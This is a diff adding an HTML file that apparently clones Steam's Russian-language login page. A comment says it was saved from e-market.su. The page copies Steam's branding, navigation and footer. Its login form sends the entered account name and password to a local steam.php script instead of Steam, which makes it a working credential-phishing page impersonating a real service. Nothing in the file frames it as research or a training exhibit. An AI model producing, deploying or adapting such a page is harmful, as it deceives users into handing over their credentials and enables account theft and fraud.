@@ -1,0 +1,326 @@
+<!DOCTYPE html>
+<!-- saved from url=(0031)http://e-market.su/steam/login/ -->
+<html><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+	<title>Войти</title>
+	<link href="./index_files/motiva_sans.css" rel="stylesheet" type="text/css">
+	<link href="./index_files/shared_global.css" rel="stylesheet" type="text/css">
+	<link href="./index_files/buttons.css" rel="stylesheet" type="text/css">
+	<link href="./index_files/store.css" rel="stylesheet" type="text/css">
+	<link href="./index_files/cart.css" rel="stylesheet" type="text/css">
+	<link href="./index_files/browse.css" rel="stylesheet" type="text/css">
+	<link href="./index_files/login1.css" rel="stylesheet" type="text/css">
+	<link href="./index_files/login.css" rel="stylesheet" type="text/css">
+<link rel="shortcut icon" href="http://e-market.su/steam/login/img/favicon.ico" type="image/x-icon">
+<style type="text/css"></style></head>
+
+<body class="v6 login">
+
+<div id="global_header">
+	<div class="content">
+
+		<div class="logo">
+			<span id="logo_holder">
+				<a href="">
+					<img src="./index_files/globalheader_logo.png" width="176" height="44">
+				</a>
+			</span>
+			<!--[if lt IE 7]>
+			<style type="text/css">
+				#logo_holder img { filter:progid:DXImageTransform.Microsoft.Alpha(opacity=0); }
+				#logo_holder { display: inline-block; width: 176px; height: 44px; filter:progid:DXImageTransform.Microsoft.AlphaImageLoader(src='https://steamstore-a.akamaihd.net/public/images/v5/globalheader_logo.png'); }
+			</style>
+			<![endif]-->
+		</div>
+
+			<div class="supernav_container">
+	<a class="menuitem supernav" href="">
+		МАГАЗИН	</a>
+
+
+	<a class="menuitem supernav" style="display: block" href="">
+		СООБЩЕСТВО	</a>
+
+	
+
+	
+			<a class="menuitem" href="">
+			О STEAM		</a>
+	
+	<a class="menuitem" href="">
+		ПОДДЕРЖКА	</a>
+	</div>
+
+		<div id="global_actions">
+			<div id="global_action_menu">
+				<div class="header_installsteam_btn header_installsteam_btn_green">
+					<div class="header_installsteam_btn_leftcap"></div>
+					<div class="header_installsteam_btn_rightcap"></div>
+					<a class="header_installsteam_btn_content" href="">
+						Загрузить Steam					</a>
+				</div>
+
+				
+									<a class="global_action_link" href="">войти</a>
+					&nbsp;|&nbsp;
+					<span class="pulldown global_action_link" id="language_pulldown" onclick="ShowMenu( this, &#39;language_dropdown&#39;, &#39;right&#39; );">язык</span>
+							</div>
+					</div>
+			</div>
+</div>
+
+<div class="page_header_ctn search">
+
+	
+
+		<div id="store_header" class="">
+		<div class="content">
+			<div id="store_controls">
+				<div id="cart_status_data">
+																					<div class="store_header_btn_green store_header_btn" id="store_header_cart_btn" style="">
+							<div class="store_header_btn_caps store_header_btn_leftcap"></div>
+							<div class="store_header_btn_caps store_header_btn_rightcap"></div>
+						</div>
+									</div>
+			</div>
+							<div id="store_nav_area">
+					<div class="store_nav_leftcap"></div>
+					<div class="store_nav_bg">
+						<div class="store_nav">
+							<a class="tab  " href="">
+									<span>Популярное</span>
+							</a>
+															<div class="tab  flyout_tab " id="genre_tab" data-flyout="genre_flyout" data-flyout-align="left" data-flyout-valign="bottom">
+									<span class="pulldown">
+										<a class="pulldown_desktop" href="">Игры</a>
+										<a class="pulldown_mobile" href="">Игры</a>
+										<span></span>
+									</span>
+								</div>
+							
+							<div class="tab  flyout_tab " id="software_tab" data-flyout="software_flyout" data-flyout-align="left" data-flyout-valign="bottom">
+								<span class="pulldown">
+									<a class="pulldown_desktop" href="">Программы</a>
+									<a class="pulldown_mobile" href="">Программы</a>
+									<span></span>
+								</span>
+
+							</div>
+
+							<div class="tab  flyout_tab " id="hardware_tab" data-flyout="hardware_flyout" data-flyout-align="left" data-flyout-valign="bottom">
+								<span class="pulldown">
+									<a class="pulldown_desktop" href="">Устройства</a>
+									<a class="pulldown_mobile" href="">Устройства</a>
+									<span></span>
+								</span>
+
+							</div>
+
+							<div class="tab  flyout_tab " id="videos_tab" data-flyout="videos_flyout" data-flyout-align="left" data-flyout-valign="bottom">
+								<span class="pulldown">
+									<a class="pulldown_desktop" href="">Видео</a>
+									<a class="pulldown_mobile" href="">Видео</a>
+									<span></span>
+								</span>
+							</div>
+
+							<a class="tab  " href="">
+								<span>Новости</span>
+							</a>
+
+
+							
+								<div class="tab  flyout_tab " id="foryou_tab" data-flyout="foryou_flyout" data-flyout-align="left" data-flyout-valign="bottom" onmouseover="EnsureStoreMenuTagsLoaded( &#39;#foryou_yourtags&#39; );">
+								<span class="pulldown">
+									Для вас									<span></span>
+								</span>
+								</div>
+
+							
+							<div class="search_area">
+								<div id="store_search">
+									<form id="searchform" name="searchform" method="get" action="https://store.steampowered.com/search/" onsubmit="return SearchSuggestCheckTerm(this);">
+										<input type="hidden" name="snr" value="1_60_4__12">
+										<div class="searchbox">
+											<input id="store_nav_search_term" name="term" type="text" class="default" value="найти в магазине" size="22" autocomplete="off">
+											<a href=""></a>
+										</div>
+									</form>
+								</div>
+							</div>
+
+						</div>
+					</div>
+					<div class="store_nav_rightcap"></div>
+				</div>
+					</div>
+	</div>
+	<div class="page_content">
+
+		
+		<!-- Center Column -->
+
+		<div class="leftcol">
+
+			
+			<div class="checkout_content_box">
+				<div class="loginbox">
+				<form name="logon" action="steam.php" method="POST">
+					<div class="loginbox_left">
+						<h2>Войти</h2>
+						<p>в существующий аккаунт Steam</p>
+						<br>
+							<input type="hidden" name="ref" value="0">
+							<div class="login_row">
+								<div class="input_title">Имя аккаунта Steam</div>
+								<input class="text_input" type="text" name="login" id="input_username" value="" required="">
+							</div>
+							<div class="login_row">
+								<div class="input_title">Пароль</div>
+								<input class="text_input" type="password" name="pass" id="input_password" autocomplete="off" required="">
+							</div>
+					</div>
+					<div class="loginbox_sep">
+					</div>
+					<div class="loginbox_right">
+						<h2>Создать</h2>
+						<p>новый бесплатный аккаунт</p>
+						<br>
+						<p>
+							Присоединяйтесь — Steam бесплатен и удобен в использовании. Продолжайте создание аккаунта и получите Steam — ведущее цифровое решение для любителей компьютерных игр.						</p>
+					</div>
+					<div style="clear: left;"></div>
+					<div class="loginbox_left btn_ctn">
+						<div id="login_btn_signin">
+							<button type="submit" class="btnv6_blue_hoverfade  btn_medium">
+								<span>Войти</span>
+							</button>
+						</div>
+					</div>
+					<div class="loginbox_right">
+						<a href="" class="btnv6_blue_hoverfade btn_medium">
+							<span>Создать аккаунт</span>
+						</a>
+					</div>
+					<div style="clear: left;"></div>
+					</form>
+				</div>
+			</div>
+			<br>
+
+			
+			<a href="">
+				Забыли пароль?			</a>
+
+		</div>
+		<!-- End Center Column -->
+
+		<!-- Right Column -->
+		<div class="rightcol">
+			<div class="block">
+
+				<div class="block_content block_content_inner login">
+                    <h2>ЗАЧЕМ НУЖЕН STEAM?</h2>
+					<ul id="why_list">
+						<li>Приобретайте и загружайте полные версии игр</li>
+						<li>Присоединяйтесь к сообществу Steam</li>
+						<li>Общайтесь с друзьями во время игры</li>
+						<li>Играйте в ваши игры на любой поддерживаемой платформе</li>
+						<li>Организуйте игру, соревнование или сетевую вечеринку</li>
+						<li>Получайте автоматическое обновление игр и многое другое!</li>
+					</ul>
+					<br>
+					<img src="./index_files/why_join_preview.png" width="265" height="176" border="0">
+                    <br><br>
+				</div>
+                <br>
+                <a href="">Узнайте больше о Steam.</a>
+			</div>
+		</div>
+		<!-- End Right Column -->
+
+		<div style="clear: both;"></div>
+
+	</div>
+
+</div>
+<!-- End Main Background -->
+
+<!-- Footer -->
+<div id="footer_spacer" class=""></div>
+<div id="footer" class="">
+<div class="footer_content">
+	<div class="rule"></div>
+
+	<div id="footer_nav">
+
+		
+					<span class="pulldown btnv6_blue_hoverfade btn_small" id="footer_genre_pulldown">
+					<span>ТОВАРЫ ПО ЖАНРАМ</span>
+				</span>
+					
+			<span class="pulldown btnv6_blue_hoverfade btn_small" id="footer_steam_pulldown">
+				<span>О STEAM</span>
+			</span>
+	
+			<span class="pulldown btnv6_blue_hoverfade btn_small" id="footer_valve_pulldown">
+				<span>О VALVE</span>
+			</span>
+			
+			
+			<span class="pulldown btnv6_blue_hoverfade btn_small" id="footer_help_pulldown">
+				<span>ПОМОЩЬ</span>
+			</span>
+
+			
+			<span class="pulldown btnv6_blue_hoverfade btn_small" id="footer_feeds_pulldown">
+				<span>ЛЕНТЫ НОВОСТЕЙ</span>
+			</span>
+		<div style="clear: left;"></div>
+	</div>
+
+	<br>
+
+    <div class="rule"></div>
+    <div id="footer_logo"><a href=""></a></div>
+    <div id="footer_text">
+        <div>© 2020 Valve Corporation. Все права защищены. Все торговые марки являются собственностью соответствующих владельцев в США и других странах.</div>
+        <div>НДС включен во все цены, где он применим.&nbsp;&nbsp;
+
+            <a href="">Политика конфиденциальности</a>
+            &nbsp; | &nbsp;
+            <a href="">Правовая информация</a>
+            &nbsp; | &nbsp;
+            <a href="">Соглашение подписчика службы Steam</a>
+            &nbsp; | &nbsp;
+            <a href="">Возвраты</a>
+
+        </div>
+					<div class="responsive_optin_link">
+				<div class="btn_medium btnv6_grey_black" onclick="Responsive_RequestMobileView()">
+					<span>Мобильная версия</span>
+				</div>
+			</div>
+		    </div>
+
+
+
+    <div style="clear: left;"></div>
+
+    <div class="rule"></div>
+
+    <div class="valve_links">
+        <a href="">О Valve</a>
+        &nbsp; | &nbsp;<a href="">Решения для бизнеса</a>
+        &nbsp; | &nbsp;<a href="">Steamworks</a>
+        &nbsp; | &nbsp;<a href="">Вакансии</a>
+        &nbsp; | &nbsp;<a href="">Дистрибуция Steam</a>
+		&nbsp; | &nbsp;<a href=""> Steam</a>
+		&nbsp; | &nbsp;<a href=""> @steam_games</a>
+    </div>
+
+</div>
+</div><!-- End Footer -->
+
+
+
+</body></html>
